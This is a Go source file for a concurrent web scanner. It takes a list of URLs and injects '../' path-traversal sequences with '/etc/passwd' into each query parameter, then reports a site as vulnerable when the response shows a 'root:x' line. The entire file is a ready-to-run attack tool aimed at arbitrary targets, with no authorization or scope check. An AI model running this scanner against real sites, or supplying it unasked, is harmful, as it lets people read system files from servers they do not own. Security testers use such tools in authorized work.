package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
)

func main() {
	var filename string
	var showHelp bool
	var numThreads int

	flag.BoolVar(&showHelp, "help", false, "Show help message")
	flag.BoolVar(&showHelp, "h", false, "Show help message (shorthand)")
	flag.StringVar(&filename, "file", "", "File containing URLs")
	flag.IntVar(&numThreads, "threads", 10, "Number of threads to use")

	flag.Parse()

	if showHelp {
		flag.Usage()
		return
	}

	var urls []string

	if filename != "" {
		urlsFromFile, err := readURLsFromFile(filename)
		if err != nil {
			fmt.Printf("Error reading file: %v\n", err)
			os.Exit(1)
		}
		urls = append(urls, urlsFromFile...)
	} else if !isInputFromPipe() {
		flag.Usage()
		return
	} else {
		urlsFromStdin, err := readURLsFromStdin()
		if err != nil {
			fmt.Printf("Error reading stdin: %v\n", err)
			os.Exit(1)
		}
		urls = append(urls, urlsFromStdin...)
	}

	if len(urls) == 0 {
		fmt.Println("No URLs provided.")
		return
	}

	testURLs(urls, numThreads)
}

func isInputFromPipe() bool {
	stat, _ := os.Stdin.Stat()
	return (stat.Mode() & os.ModeCharDevice) == 0
}

func readURLsFromFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var urls []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		urls = append(urls, scanner.Text())
	}

	return urls, scanner.Err()
}

func readURLsFromStdin() ([]string, error) {
	var urls []string
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		urls = append(urls, scanner.Text())
	}
	return urls, scanner.Err()
}

func testURLs(urls []string, numThreads int) {
	var wg sync.WaitGroup
	var mutex sync.Mutex
	totalURLs := len(urls)
	checkedURLs := 0
	vulnURLs := 0
	semaphore := make(chan struct{}, numThreads)

	for _, url := range urls {
		semaphore <- struct{}{}
		wg.Add(1)
		go func(url string) {
			defer wg.Done()
			defer func() { <-semaphore }() // Release semaphore when done
			if isValidURL(url) {
				checkedURLs++
				vulnerable, param, payload := testURL(url)
				if vulnerable {
					mutex.Lock()
					vulnURLs++
					fmt.Printf("\r\033[31mVulnerable URLs found: %d/%d\033[0m", vulnURLs, checkedURLs)
					mutex.Unlock()
					fmt.Printf("\n\033[31mVulnerable URL: %s (Parameter: %s, Payload: %s)\033[0m\n", url, param, payload)
				} else {
					fmt.Printf("\r\033[32mChecked URLs: %d/%d\033[0m", checkedURLs, totalURLs)
				}
			}
		}(url)
	}

	wg.Wait()

	fmt.Printf("\n\033[32mAll URLs processed. Checked URLs: %d/%d, Vulnerable URLs found: %d/%d\033[0m\n", checkedURLs, totalURLs, vulnURLs, totalURLs)
}

func testURL(url string) (bool, string, string) {
	resp, err := http.Get(url)
	if err != nil {
		return false, "", ""
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 && resp.StatusCode < 600 {
		return false, "", ""
	}

	if resp.StatusCode == http.StatusOK {
		for _, param := range extractParams(url) {
			payloads := []string{"..", "..", "../..", "../../..", "../../../..", "../../../../..", "../../../../../..", "../../../../../../..", "../../../../../../../..", "../../../../../../../../.."}
			for _, payload := range payloads {
				modifiedURL := constructURL(url, param, payload)

				resp, err := http.Get(modifiedURL)
				if err != nil {
					continue
				}
				defer resp.Body.Close()

				if resp.StatusCode >= 400 && resp.StatusCode < 600 {
					continue
				}

				if resp.StatusCode == http.StatusOK {
					scanner := bufio.NewScanner(resp.Body)
					for scanner.Scan() {
						if strings.Contains(scanner.Text(), "root:x") {
							return true, param, payload
						}
					}
				}
			}
		}
	}
	return false, "", ""
}

func extractParams(url string) []string {
	queryParams := strings.Split(url, "?")
	if len(queryParams) < 2 {
		return nil
	}
	params := strings.Split(queryParams[1], "&")
	var result []string
	for _, param := range params {
		parts := strings.Split(param, "=")
		if len(parts) == 2 {
			result = append(result, parts[0])
		}
	}
	return result
}

func isValidURL(url string) bool {
	_, err := http.Get(url)
	return err == nil
}

func constructURL(baseURL, param, payload string) string {
	parts := strings.Split(baseURL, "?")
	if len(parts) != 2 {
		return ""
	}

	return fmt.Sprintf("%s?%s=%s/etc/passwd", parts[0], param, payload)
}
